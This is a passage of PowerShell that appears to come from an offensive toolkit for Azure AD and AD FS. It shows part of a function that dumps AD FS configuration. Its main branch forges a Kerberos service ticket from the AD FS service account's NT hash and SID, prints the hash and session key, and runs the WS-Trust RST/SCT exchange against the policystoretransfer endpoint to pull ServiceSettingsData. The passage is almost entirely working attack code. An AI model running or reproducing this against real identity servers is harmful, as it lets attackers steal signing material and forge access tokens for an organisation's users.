            $serializer = $misAssembly.GetType('Microsoft.IdentityServer.PolicyModel.Configuration.Utility')

            # Convert the configuration object to xml using .NET Reflection
            # public static string Serialize(ContractObject obj, bool indent = false)
            $configuration = Invoke-ReflectionMethod -TypeObject $serializer -Method "Serialize" -Parameters @($configObject,$false)
        }
        elseif($AsLoggedInUser) # Read the configuration as the logged in user
        {
            $configuration = Export-ADFSConfigurationUsingWCF -Server $Server
        }
        else # Read configuration from remote server by emulating ADFS sync
        {
            # Check the hash and SID
            if($Hash -is [array])
            {
                $strHash = Convert-ByteArrayToHex -Bytes ([byte[]]$Hash)
                Remove-Variable "Hash"
                $Hash = $strHash
            }
            elseif($Hash -isnot [string])
            {
                Throw "Hash must be a byte array or a hexadecimal string"
            }

            if($SID -is [array])
            {
                $sidObject = [System.Security.Principal.SecurityIdentifier]::new(([byte[]]$SID),0)
                Remove-Variable "SID"
                $SID = $sidObject.toString
            }
            elseif($SID -is [System.Security.Principal.SecurityIdentifier])
            {
                $sidObject = $SID
                Remove-Variable "SID"
                $SID = $sidObject.toString
            }
            elseif($SID -isnot [string])
            {
                Throw "SID must be a System.Security.Principal.SecurityIdentifier, byte array or a hexadecimal string"
            }

            Write-Verbose "* Start dumping AD FS configuration from $server`n"
    
            # Generate required stuff
            $sessionKey =    (New-Guid).ToByteArray()
            $params=@{
                hash =             $Hash
                SidString =        $SID
                UserName=          'svc_ADFS$'
                UserDisplayName=   ""
                UserPrincipalName= 'svc_ADFS$@company.com'
                ServerName=        "DC"
                DomainName=        "COMPANY"
                Realm=             "COMPANY.COM"
                ServiceTarget =    "host/sts.company.com"
                SessionKey =       $sessionKey
            }
            $kerberosTicket = New-KerberosTicket @Params                
            $clientSecret =   Get-RandomBytes -Bytes 32

            Write-Verbose "User NTHASH:   $Hash"
            Write-Verbose "Client secret: $(Convert-ByteArrayToB64 -Bytes $clientSecret)"
            Write-Verbose "Session key:   $(Convert-ByteArrayToB64 -Bytes $sessionKey)`n"
    
            Write-Verbose "RST begin"
                      
            # Request Security Token 
            $envelope =      Create-RSTEnvelope -Server $server -KerberosTicket $kerberosTicket
            [xml]$response = Invoke-RestMethod -UseBasicParsing -uri "http://$Server/adfs/services/policystoretransfer" -Method Post -Body $envelope -ContentType "application/soap+xml"
            $RSTR =          Parse-RSTR -RSTR $response -Key $sessionKey

            Write-Verbose "RST end`n"
            Write-Verbose "SCT begin"
 
            # Request Security Context Token 
            $envelope =      Create-SCTEnvelope -Key $RSTR.Key -ClientSecret $clientSecret -Context $RSTR.Context -KeyIdentifier $RSTR.Identifier -Server $server
        
            try
            {
                [xml]$response = Invoke-RestMethod -UseBasicParsing -uri "http://$Server/adfs/services/policystoretransfer" -Method Post -Body $envelope -ContentType "application/soap+xml"
            }
            catch
            {
                # Catch the error and try to parse the SOAP document
                $str=$_.Exception.Response.GetResponseStream()
                $buf = new-object byte[] $str.Length
                $str.Position = 0
                $str.Read($buf,0,$str.Length) | Out-Null
                [xml]$response=[text.encoding]::UTF8.GetString($buf)
            }
            Check-SoapError -Message $response

            $CSTR = Parse-SCTR -SCTR $response -Key $RSTR.Key

            Write-Verbose "SCT end`n"
    
            # Get the capabilities    
            #[xml]$response = Invoke-ADFSSoapRequest -Key $CSTR.Key -Context $CSTR.Context -KeyIdentifier $CSTR.Identifier -Server $server -Command Capabilities

            Write-Verbose "ServiceSettings start"
    
            # Get the settings        
            [xml]$response = Invoke-ADFSSoapRequest -Key $CSTR.Key -Context $CSTR.Context -KeyIdentifier $CSTR.Identifier -Server $server -Command ServiceSettings
            Write-Verbose "ServiceSettings end"
    
            $configuration = $response.GetStateResponse.GetStateResult.PropertySets.PropertySet.Property | where Name -eq "ServiceSettingsData" | select -ExpandProperty Values | select -ExpandProperty Value_x007B_0_x007D_
        
        }

        Write-Verbose "Configuration successfully read ($($configuration.Length) bytes)."
        return $configuration
    }
}